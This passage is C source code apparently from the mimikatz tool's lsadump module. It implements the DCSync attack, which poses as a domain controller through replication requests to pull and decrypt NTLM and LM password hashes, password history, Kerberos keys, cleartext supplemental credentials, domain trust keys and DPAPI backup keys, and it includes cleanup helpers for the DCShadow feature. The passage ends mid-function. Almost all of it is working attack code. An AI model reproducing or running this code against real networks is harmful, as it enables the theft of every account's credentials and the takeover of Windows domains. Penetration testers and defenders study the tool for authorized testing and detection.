/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com

	Vincent LE TOUX
	http://pingcastle.com / http://mysmartlogon.com
	vincent.letoux@gmail.com

	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_lsadump_dc.h"

LPCSTR kuhl_m_lsadump_dcsync_oids[] = {
	szOID_ANSI_name,
	szOID_ANSI_sAMAccountName, szOID_ANSI_userPrincipalName, szOID_ANSI_sAMAccountType,
	szOID_ANSI_userAccountControl, szOID_ANSI_accountExpires, szOID_ANSI_pwdLastSet,
	szOID_ANSI_objectSid, szOID_ANSI_sIDHistory,
	szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
	szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
	szOID_ANSI_currentValue,
};
LPCSTR kuhl_m_lsadump_dcsync_oids_export[] = {
	szOID_ANSI_name,
	szOID_ANSI_sAMAccountName, szOID_ANSI_objectSid,
	szOID_ANSI_unicodePwd
};
NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
{
	LSA_OBJECT_ATTRIBUTES objectAttributes = {0};
	PPOLICY_DNS_DOMAIN_INFO pPolicyDnsDomainInfo = NULL;
	RPC_BINDING_HANDLE hBinding;
	DRS_HANDLE hDrs = NULL;
	DSNAME dsName = {0};
	DRS_MSG_GETCHGREQ getChReq = {0};
	DWORD dwOutVersion = 0, i;
	DRS_MSG_GETCHGREPLY getChRep;
	ULONG drsStatus;
	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL, szService;
	LPWSTR szTmpDc = NULL;
	DRS_EXTENSIONS_INT DrsExtensionsInt;
	BOOL someExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL), allData = kull_m_string_args_byName(argc, argv, L"all", NULL, NULL), csvOutput = kull_m_string_args_byName(argc, argv, L"csv", NULL, NULL);
	
	if(!kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
		if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
			szDomain = pPolicyDnsDomainInfo->DnsDomainName.Buffer;

	if(szDomain && wcschr(szDomain, L'.'))
	{
		kprintf(L"[DC] \'%s\' will be the domain\n", szDomain);
		if(!(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL) || kull_m_string_args_byName(argc, argv, L"kdc", &szDc, NULL)))
			if(kull_m_net_getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &szTmpDc))
				szDc = szTmpDc;
		
		if(szDc)
		{
			kprintf(L"[DC] \'%s\' will be the DC server\n", szDc);
			if(allData || kull_m_string_args_byName(argc, argv, L"guid", &szGuid, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
			{
				if(allData)
					kprintf(L"[DC] Exporting domain \'%s\'\n", szDomain);
				else if(szGuid)
					kprintf(L"[DC] Object with GUID \'%s\'\n", szGuid);
				else
					kprintf(L"[DC] \'%s\' will be the user account\n", szUser);

				kull_m_string_args_byName(argc, argv, L"altservice", &szService, L"ldap");
				if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE, (MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
				{
					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt))
					{
						if(DrsExtensionsInt.dwReplEpoch)
							kprintf(L"[DC] ms-DS-ReplicationEpoch is: %u\n", DrsExtensionsInt.dwReplEpoch);
						if(kull_m_rpc_drsr_getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs, &DrsExtensionsInt))
						{
							getChReq.V8.pNC = &dsName;
							getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
							getChReq.V8.cMaxObjects = (allData ? 1000 : 1);
							getChReq.V8.cMaxBytes = 0x00a00000; // 10M
							getChReq.V8.ulExtendedOp = (allData ? 0 : EXOP_REPL_OBJ);

							if(getChReq.V8.pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT *) MIDL_user_allocate(sizeof(PARTIAL_ATTR_VECTOR_V1_EXT) + sizeof(ATTRTYP) * ((allData ? ARRAYSIZE(kuhl_m_lsadump_dcsync_oids_export) : ARRAYSIZE(kuhl_m_lsadump_dcsync_oids)) - 1)))
							{
								getChReq.V8.pPartialAttrSet->dwVersion = 1;
								getChReq.V8.pPartialAttrSet->dwReserved1 = 0;
								if(allData)
								{
									getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(kuhl_m_lsadump_dcsync_oids_export);
									for(i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
										kull_m_rpc_drsr_MakeAttid(&getChReq.V8.PrefixTableDest, kuhl_m_lsadump_dcsync_oids_export[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
								}
								else
								{
									getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(kuhl_m_lsadump_dcsync_oids);
									for(i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
										kull_m_rpc_drsr_MakeAttid(&getChReq.V8.PrefixTableDest, kuhl_m_lsadump_dcsync_oids[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
								}
								RpcTryExcept
								{
									do
									{
										RtlZeroMemory(&getChRep, sizeof(DRS_MSG_GETCHGREPLY));
										drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
										if(drsStatus == 0)
										{
											if(dwOutVersion == 6 && (allData || getChRep.V6.cNumObjects == 1))
											{
												if(kull_m_rpc_drsr_ProcessGetNCChangesReply(&getChRep.V6.PrefixTableSrc, getChRep.V6.pObjects))
												{
													REPLENTINFLIST* pObject = getChRep.V6.pObjects;
													for(i = 0; i < getChRep.V6.cNumObjects; i++)
													{
														if(csvOutput)
															kuhl_m_lsadump_dcsync_descrObject_csv(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock);
														else
															kuhl_m_lsadump_dcsync_descrObject(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, szDomain, someExport);
														pObject = pObject->pNextEntInf;
													}
												}
												else
												{
													PRINT_ERROR(L"kull_m_rpc_drsr_ProcessGetNCChangesReply\n");
													break;
												}
												if(allData)
												{
													RtlCopyMemory(&getChReq.V8.uuidInvocIdSrc, &getChRep.V6.uuidInvocIdSrc, sizeof(UUID));
													RtlCopyMemory(&getChReq.V8.usnvecFrom, &getChRep.V6.usnvecTo, sizeof(USN_VECTOR));
												}
											}
											else PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion (%u) and/or cNumObjects (%u)\n", dwOutVersion, getChRep.V6.cNumObjects);
											kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data(dwOutVersion, &getChRep);
											
										}
										else PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);
									}
									while(getChRep.V6.fMoreData);
									IDL_DRSUnbind(&hDrs);
								}
								RpcExcept(RPC_EXCEPTION)
									PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
								RpcEndExcept

								kull_m_rpc_drsr_free_SCHEMA_PREFIX_TABLE_data(&getChReq.V8.PrefixTableDest);
								MIDL_user_free(getChReq.V8.pPartialAttrSet);
							}
						}
					}
					kull_m_rpc_deleteBinding(&hBinding);
				}
			}
			else PRINT_ERROR(L"Missing user or guid argument\n");
		}
		else PRINT_ERROR(L"Domain Controller not present\n");
	}
	else PRINT_ERROR(L"Domain not present, or doesn\'t look like a FQDN\n");

	if(szTmpDc)
		LocalFree(szTmpDc);
	if(pPolicyDnsDomainInfo)
		LsaFreeMemory(pPolicyDnsDomainInfo);

	return STATUS_SUCCESS;
}

BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory)
{
	DWORD i;
	BOOL status = FALSE;
	BYTE data[LM_NTLM_HASH_LENGTH];
	for(i = 0; i < encodedDataSize; i += LM_NTLM_HASH_LENGTH)
	{
		status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(encodedData + i, &rid, data));
		if(status)
		{
			if(isHistory)
				kprintf(L"    %s-%2u: ", prefix, i / LM_NTLM_HASH_LENGTH);
			else
				kprintf(L"  Hash %s: ", prefix);
			kull_m_string_wprintf_hex(data, LM_NTLM_HASH_LENGTH, 0);
			kprintf(L"\n");
		}
		else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
	}
	return status;
}

void kuhl_m_lsadump_dcsync_descrObject_csv(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes)
{
	DWORD rid = 0;
	PBYTE unicodePwd;
	DWORD unicodePwdSize;
	PVOID sid;
	BYTE clearHash[LM_NTLM_HASH_LENGTH];
	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, NULL, NULL) &&
		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_objectSid, &sid, NULL) &&
		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_unicodePwd, &unicodePwd, &unicodePwdSize))
	{
		rid = *GetSidSubAuthority(sid, *GetSidSubAuthorityCount(sid) - 1);
		kprintf(L"%u\t", rid);
		kull_m_rpc_drsr_findPrintMonoAttr(NULL, prefixTable, attributes, szOID_ANSI_sAMAccountName, FALSE);
		kprintf(L"\t");
		if(NT_SUCCESS(RtlDecryptDES2blocks1DWORD(unicodePwd, &rid, clearHash)))
			kull_m_string_wprintf_hex(clearHash, LM_NTLM_HASH_LENGTH, 0);
		else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
		kprintf(L"\n");
	}
}

void kuhl_m_lsadump_dcsync_descrObject(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCWSTR szSrcDomain, BOOL someExport)
{
	kull_m_rpc_drsr_findPrintMonoAttr(L"\nObject RDN           : ", prefixTable, attributes, szOID_ANSI_name, TRUE);
	kprintf(L"\n");
	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, NULL, NULL))
		kuhl_m_lsadump_dcsync_descrUser(prefixTable, attributes);
	else if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_trustPartner, NULL, NULL))
		kuhl_m_lsadump_dcsync_descrTrust(prefixTable, attributes, szSrcDomain);
	else if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_currentValue, NULL, NULL))
		kuhl_m_lsadump_dcsync_descrSecret(prefixTable, attributes, someExport);
}

const wchar_t * KUHL_M_LSADUMP_UF_FLAG[] = {
	L"SCRIPT", L"ACCOUNTDISABLE", L"0x4 ?", L"HOMEDIR_REQUIRED", L"LOCKOUT", L"PASSWD_NOTREQD", L"PASSWD_CANT_CHANGE", L"ENCRYPTED_TEXT_PASSWORD_ALLOWED",
	L"TEMP_DUPLICATE_ACCOUNT", L"NORMAL_ACCOUNT", L"0x400 ?", L"INTERDOMAIN_TRUST_ACCOUNT", L"WORKSTATION_TRUST_ACCOUNT", L"SERVER_TRUST_ACCOUNT", L"0x4000 ?", L"0x8000 ?",
	L"DONT_EXPIRE_PASSWD", L"MNS_LOGON_ACCOUNT", L"SMARTCARD_REQUIRED", L"TRUSTED_FOR_DELEGATION", L"NOT_DELEGATED", L"USE_DES_KEY_ONLY", L"DONT_REQUIRE_PREAUTH", L"PASSWORD_EXPIRED", 
	L"TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION", L"NO_AUTH_DATA_REQUIRED", L"PARTIAL_SECRETS_ACCOUNT", L"USE_AES_KEYS", L"0x10000000 ?", L"0x20000000 ?", L"0x40000000 ?", L"0x80000000 ?",
};

LPCWSTR kuhl_m_lsadump_samAccountType_toString(DWORD accountType)
{
	LPCWSTR target;
	switch(accountType)
	{
	case SAM_DOMAIN_OBJECT:
		target = L"DOMAIN_OBJECT";
		break;
	case SAM_GROUP_OBJECT:
		target = L"GROUP_OBJECT";
		break;
	case SAM_NON_SECURITY_GROUP_OBJECT:
		target = L"NON_SECURITY_GROUP_OBJECT";
		break;
	case SAM_ALIAS_OBJECT:
		target = L"ALIAS_OBJECT";
		break;
	case SAM_NON_SECURITY_ALIAS_OBJECT:
		target = L"NON_SECURITY_ALIAS_OBJECT";
		break;
	case SAM_USER_OBJECT:
		target = L"USER_OBJECT";
		break;
	case SAM_MACHINE_ACCOUNT:
		target = L"MACHINE_ACCOUNT";
		break;
	case SAM_TRUST_ACCOUNT:
		target = L"TRUST_ACCOUNT";
		break;
	case SAM_APP_BASIC_GROUP:
		target = L"APP_BASIC_GROUP";
		break;
	case SAM_APP_QUERY_GROUP:
		target = L"APP_QUERY_GROUP";
		break;
	default:
		target = L"unknown";
	}
	return target;
}

void kuhl_m_lsadump_dcsync_descrUser(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes)
{
	DWORD rid = 0, i;
	PBYTE encodedData;
	DWORD encodedDataSize;
	PVOID data;
	ATTRVALBLOCK *sids;
	
	kprintf(L"** SAM ACCOUNT **\n\n");
	kull_m_rpc_drsr_findPrintMonoAttr(L"SAM Username         : ", prefixTable, attributes, szOID_ANSI_sAMAccountName, TRUE);
	kull_m_rpc_drsr_findPrintMonoAttr(L"User Principal Name  : ", prefixTable, attributes, szOID_ANSI_userPrincipalName, TRUE);
	
	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountType, &data, NULL))
		kprintf(L"Account Type         : %08x ( %s )\n", *(PDWORD) data, kuhl_m_lsadump_samAccountType_toString(*(PDWORD) data));

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_userAccountControl, &data, NULL))
	{
		kprintf(L"User Account Control : %08x ( ", *(PDWORD) data);
		for(i = 0; i < min(ARRAYSIZE(KUHL_M_LSADUMP_UF_FLAG), sizeof(DWORD) * 8); i++)
			if((1 << i) & *(PDWORD) data)
				kprintf(L"%s ", KUHL_M_LSADUMP_UF_FLAG[i]);
		kprintf(L")\n");
	}

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_accountExpires, &data, NULL))
	{
		kprintf(L"Account expiration   : ");
		kull_m_string_displayLocalFileTime((LPFILETIME) data);
		kprintf(L"\n");
	}

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_pwdLastSet, &data, NULL))
	{
		kprintf(L"Password last change : ");
		kull_m_string_displayLocalFileTime((LPFILETIME) data);
		kprintf(L"\n");
	}
	
	if(sids = kull_m_rpc_drsr_findAttr(prefixTable, attributes, szOID_ANSI_sIDHistory))
	{
		kprintf(L"SID history:\n");
		for(i = 0; i < sids->valCount; i++)
		{
			kprintf(L"  ");
			kull_m_string_displaySID(sids->pAVal[i].pVal);
			kprintf(L"\n");
		}
	}

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_objectSid, &data, NULL))
	{
		kprintf(L"Object Security ID   : ");
		kull_m_string_displaySID(data);
		kprintf(L"\n");
		rid = *GetSidSubAuthority(data, *GetSidSubAuthorityCount(data) - 1);
		kprintf(L"Object Relative ID   : %u\n", rid);

		kprintf(L"\nCredentials:\n");
		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_unicodePwd, &encodedData, &encodedDataSize))
			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"NTLM", FALSE);
		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_ntPwdHistory, &encodedData, &encodedDataSize))
			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"ntlm", TRUE);
		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_dBCSPwd, &encodedData, &encodedDataSize))
			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"LM  ", FALSE);
		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_lmPwdHistory, &encodedData, &encodedDataSize))
			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"lm  ", TRUE);
	}

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_supplementalCredentials, &encodedData, &encodedDataSize))
	{
		kprintf(L"\nSupplemental Credentials:\n");
		kuhl_m_lsadump_dcsync_descrUserProperties((PUSER_PROPERTIES) encodedData);
	}
}

DECLARE_CONST_UNICODE_STRING(PrimaryCleartext, L"Primary:CLEARTEXT");
DECLARE_CONST_UNICODE_STRING(PrimaryWDigest, L"Primary:WDigest");
DECLARE_CONST_UNICODE_STRING(PrimaryKerberos, L"Primary:Kerberos");
DECLARE_CONST_UNICODE_STRING(PrimaryKerberosNew, L"Primary:Kerberos-Newer-Keys");
DECLARE_CONST_UNICODE_STRING(PrimaryNtlmStrongNTOWF, L"Primary:NTLM-Strong-NTOWF");
DECLARE_CONST_UNICODE_STRING(Packages, L"Packages");
void kuhl_m_lsadump_dcsync_descrUserProperties(PUSER_PROPERTIES properties)
{
	DWORD i, j, k, szData;
	PUSER_PROPERTY property;
	PBYTE data;
	UNICODE_STRING Name;
	LPSTR value;

	PWDIGEST_CREDENTIALS pWDigest;
	PKERB_STORED_CREDENTIAL pKerb;
	PKERB_KEY_DATA pKeyData;
	PKERB_STORED_CREDENTIAL_NEW pKerbNew;
	PKERB_KEY_DATA_NEW pKeyDataNew;

	if(properties->Length > (FIELD_OFFSET(USER_PROPERTIES, PropertyCount) - FIELD_OFFSET(USER_PROPERTIES, Reserved4)))
	{
		if((properties->PropertySignature == L'P') && properties->PropertyCount)
		{
			for(i = 0, property = properties->UserProperties; i < properties->PropertyCount; i++, property = (PUSER_PROPERTY) ((PBYTE) property + FIELD_OFFSET(USER_PROPERTY, PropertyName) + property->NameLength + property->ValueLength))
			{
				Name.Length = Name.MaximumLength = property->NameLength;
				Name.Buffer = property->PropertyName;

				value = (LPSTR) ((LPCBYTE) property->PropertyName + property->NameLength);
				szData = property->ValueLength / 2;

				kprintf(L"* %wZ *\n", &Name);
				if(data = (PBYTE) LocalAlloc(LPTR, szData))
				{
					for(j = 0; j < szData; j++)
					{
						sscanf_s(&value[j*2], "%02x", &k);
						data[j] = (BYTE) k;
					}

					if(RtlEqualUnicodeString(&PrimaryCleartext, &Name, TRUE) || RtlEqualUnicodeString(&Packages, &Name, TRUE))
					{
						kprintf(L"    %.*s\n", szData / sizeof(wchar_t), (PWSTR) data);
					}
					else if(RtlEqualUnicodeString(&PrimaryWDigest, &Name, TRUE))
					{
						pWDigest = (PWDIGEST_CREDENTIALS) data;
						for(j = 0; j < pWDigest->NumberOfHashes; j++)
						{
							kprintf(L"    %02u  ", j + 1);
							kull_m_string_wprintf_hex(pWDigest->Hash[j], MD5_DIGEST_LENGTH, 0);
							kprintf(L"\n");
						}
					}
					else if(RtlEqualUnicodeString(&PrimaryKerberos, &Name, TRUE))
					{
						pKerb = (PKERB_STORED_CREDENTIAL) data;
						kprintf(L"    Default Salt : %.*s\n", pKerb->DefaultSaltLength / sizeof(wchar_t), (PWSTR) ((PBYTE) pKerb + pKerb->DefaultSaltOffset));
						pKeyData = (PKERB_KEY_DATA) ((PBYTE) pKerb + sizeof(KERB_STORED_CREDENTIAL));
						pKeyData = kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->CredentialCount, L"Credentials");
						kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->OldCredentialCount, L"OldCredentials");
					}
					else if(RtlEqualUnicodeString(&PrimaryKerberosNew, &Name, TRUE))
					{
						pKerbNew = (PKERB_STORED_CREDENTIAL_NEW) data;
						kprintf(L"    Default Salt : %.*s\n    Default Iterations : %u\n", pKerbNew->DefaultSaltLength / sizeof(wchar_t), (PWSTR) ((PBYTE) pKerbNew + pKerbNew->DefaultSaltOffset), pKerbNew->DefaultIterationCount);
						pKeyDataNew = (PKERB_KEY_DATA_NEW) ((PBYTE) pKerbNew + sizeof(KERB_STORED_CREDENTIAL_NEW));
						pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->CredentialCount, L"Credentials");
						pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->ServiceCredentialCount, L"ServiceCredentials");
						pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OldCredentialCount, L"OldCredentials");
						kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OlderCredentialCount, L"OlderCredentials");
					}
					else if(RtlEqualUnicodeString(&PrimaryNtlmStrongNTOWF, &Name, TRUE))
					{
						kprintf(L"    Random Value : ");
						kull_m_string_wprintf_hex(data, szData, 0);
						kprintf(L"\n");
					}
					else
					{
						kprintf(L"    Unknown data : ");
						kull_m_string_wprintf_hex(data, szData, 1);
						kprintf(L"\n");
					}
					kprintf(L"\n");
					LocalFree(data);
				}
			}
		}
	}
}

void kuhl_m_lsadump_dcsync_descrTrust(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCWSTR szSrcDomain)
{
	PBYTE encodedData;
	DWORD encodedDataSize;
	UNICODE_STRING uPartner, uDomain, uUpcasePartner, uUpcaseDomain;
	
	kprintf(L"** TRUSTED DOMAIN - Antisocial **\n\n");
	
	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_trustPartner, &encodedData, &encodedDataSize))
	{
		uPartner.Length = uPartner.MaximumLength = (USHORT) encodedDataSize;
		uPartner.Buffer = (PWSTR) encodedData;
		kprintf(L"Partner              : %wZ\n", &uPartner);
		if(NT_SUCCESS(RtlUpcaseUnicodeString(&uUpcasePartner, &uPartner, TRUE)))
		{
			RtlInitUnicodeString(&uDomain, szSrcDomain);
			if(NT_SUCCESS(RtlUpcaseUnicodeString(&uUpcaseDomain, &uDomain, TRUE)))
			{
				kuhl_m_lsadump_dcsync_descrTrustAuthentication(prefixTable, attributes, &uUpcaseDomain, &uUpcasePartner, TRUE);
				kuhl_m_lsadump_dcsync_descrTrustAuthentication(prefixTable, attributes, &uUpcaseDomain, &uUpcasePartner, FALSE);
				RtlFreeUnicodeString(&uUpcaseDomain);
			}
			RtlFreeUnicodeString(&uUpcasePartner);
		}
	}
}

void kuhl_m_lsadump_dcsync_descrTrustAuthentication(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, PCUNICODE_STRING domain, PCUNICODE_STRING partner, BOOL isIn)
{
	PBYTE encodedData;
	DWORD encodedDataSize;
	PNTDS_LSA_AUTH_INFORMATIONS authInfos;
	LPCWSTR prefix, prefixOld;
	PCUNICODE_STRING from, dest;

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, isIn ? szOID_ANSI_trustAuthIncoming : szOID_ANSI_trustAuthOutgoing, &encodedData, &encodedDataSize))
	{
		if(isIn)
		{
			prefix = L"  In ";
			prefixOld = L" In-1";
			from = domain;
			dest = partner;
		}
		else
		{
			prefix = L" Out ";
			prefixOld = L"Out-1";
			from = partner;
			dest = domain;
		}
		authInfos = (PNTDS_LSA_AUTH_INFORMATIONS) encodedData;
		if(authInfos->count)
		{
			if(authInfos->offsetToAuthenticationInformation)
				kuhl_m_lsadump_trust_authinformation(NULL, 0, (PNTDS_LSA_AUTH_INFORMATION) ((PBYTE) authInfos + FIELD_OFFSET(NTDS_LSA_AUTH_INFORMATIONS, count) + authInfos->offsetToAuthenticationInformation), prefix, from, dest);
			if(authInfos->offsetToPreviousAuthenticationInformation)
				kuhl_m_lsadump_trust_authinformation(NULL, 0, (PNTDS_LSA_AUTH_INFORMATION) ((PBYTE) authInfos + FIELD_OFFSET(NTDS_LSA_AUTH_INFORMATIONS, count) + authInfos->offsetToPreviousAuthenticationInformation), prefixOld, from, dest);
		}
	}
}

void kuhl_m_lsadump_dcsync_descrSecret(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, BOOL someExport)
{
	PVOID data;
	PWSTR name, ptr;
	DWORD size;
	USHORT szGuid;
	GUID guid;
	UNICODE_STRING uGuid;

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_name, &data, &size))
	{
		if(name = (PWSTR) LocalAlloc(LPTR, size + sizeof(wchar_t)))
		{
			RtlCopyMemory(name, data, size);
			if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_currentValue, &data, &size))
			{
				if(name == wcsstr(name, L"BCKUPKEY_"))
				{
					if(((_wcsicmp(name, L"BCKUPKEY_P Secret") == 0) || (_wcsicmp(name, L"BCKUPKEY_PREFERRED Secret") == 0)) && (size == sizeof(GUID)))
					{
						kprintf(L"Link to key with GUID: ");
						kull_m_string_displayGUID((LPCGUID) data);
						kprintf(L" (not an object GUID)\n");
					}
					else if(ptr = wcschr(name + 9, L' '))
					{
						szGuid = (USHORT) ((ptr - (name + 9)) * sizeof(wchar_t));
						uGuid.Length = uGuid.MaximumLength = szGuid + (2 * sizeof(wchar_t));
						if(uGuid.Buffer = (PWSTR) LocalAlloc(LPTR, uGuid.MaximumLength))
						{
							uGuid.Buffer[0] = L'{';
							RtlCopyMemory(uGuid.Buffer + 1, name + 9, szGuid);
							uGuid.Buffer[(uGuid.Length >> 1) - 1] = L'}';
							if(NT_SUCCESS(RtlGUIDFromString(&uGuid, &guid)))
								kuhl_m_lsadump_analyzeKey(&guid, (PKIWI_BACKUP_KEY) data, size, someExport);
							LocalFree(uGuid.Buffer);
						}
					}
				}
				else kull_m_string_wprintf_hex(data, size, 1 | (16 << 16));
			}
			LocalFree(name);
		}
	}
}

BOOL kuhl_m_lsadump_dcshadow_clean_push_request(PDCSHADOW_PUSH_REQUEST request)
{
	DWORD i, j, k;
	PDCSHADOW_PUSH_REQUEST_OBJECT pObject;
	PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE pAttribute;

	if(request->cNumObjects)
	{
		for(i = 0; i < request->cNumObjects; i++)
		{
			pObject = request->pObjects + i;
			for(j = 0; j < pObject->cbAttributes; j++)
			{
				pAttribute = pObject->pAttributes + j;
				if(pAttribute->AttrVal.valCount != 0)
				{
					for(k = 0; k < pAttribute->AttrVal.valCount; k++)
						LocalFree(pAttribute->pszValue[k]);
					LocalFree(pAttribute->pszValue);
				}
			}
			LocalFree(pObject->pAttributes);
		}
		LocalFree(request->pObjects);
	}
	request->cNumObjects = 0;
	request->pObjects = NULL;
	
	for(i = 0; i < request->cNumAttributes; i++)
	{
		LocalFree(request->pAttributes[i].szAttributeName);
		if(request->pAttributes[i].Oid)
			LocalFree(request->pAttributes[i].Oid);
	}
	LocalFree(request->pAttributes);
	request->pAttributes = NULL;
	request->cNumAttributes = 0;
	return TRUE;
}

void kuhl_m_lsadump_dcshadow_clean_domain_info(PDCSHADOW_DOMAIN_INFO info)
{
	if(info->szDomainName)
		LocalFree(info->szDomainName);
	if(info->szDomainNamingContext)
		LocalFree(info->szDomainNamingContext);
	if(info->szDCDsServiceName)
		LocalFree(info->szDCDsServiceName);
	if(info->szConfigurationNamingContext)
		LocalFree(info->szConfigurationNamingContext);
	if(info->szDsServiceName)
		LocalFree(info->szDsServiceName);
	if(info->hGetNCChangeCalled)
		CloseHandle(info->hGetNCChangeCalled);
	if(info->ld)
		ldap_unbind(info->ld);
	if(info->request)
		kuhl_m_lsadump_dcshadow_clean_push_request(info->request);
}

static BOOL kuhl_m_lsadump_dcshadow_remove_object(PDCSHADOW_PUSH_REQUEST request, PCWSTR szObject)
{
	DWORD i, j, k;
	PDCSHADOW_PUSH_REQUEST_OBJECT pObject;
	PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE pAttribute;

	for(i = 0; i < request->cNumObjects; i++)
	{
		pObject = request->pObjects + i;
		if(!_wcsicmp(pObject->szObjectDN, szObject))
		{
			if(request->cNumObjects == 1)
				return kuhl_m_lsadump_dcshadow_clean_push_request(request);
			for(j = 0; j < pObject->cbAttributes ; j++)
			{
				pAttribute = pObject->pAttributes + i;
				if(pAttribute->AttrVal.valCount)
				{
					for(k = 0; k < pAttribute->AttrVal.valCount; k++)
						LocalFree(pAttribute->pszValue[k]);
					LocalFree(pAttribute->pszValue);
				}
			}
			LocalFree(pObject->pAttributes);
			RtlCopyMemory(pObject, request->pObjects + request->cNumObjects -1, sizeof(DCSHADOW_PUSH_REQUEST_OBJECT));
			request->cNumObjects--;
			return TRUE;
		}
	}
	return FALSE;
}

BOOL kuhl_m_lsadump_dcshadow_remove_attribute(PDCSHADOW_PUSH_REQUEST request, PCWSTR szObject, PCWSTR szAttribute)
{
	DWORD i, j, k;
	PDCSHADOW_PUSH_REQUEST_OBJECT pObject;
	PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE pAttribute;

	for(i = 0; i < request->cNumObjects; i++)
	{
		pObject = request->pObjects + i;
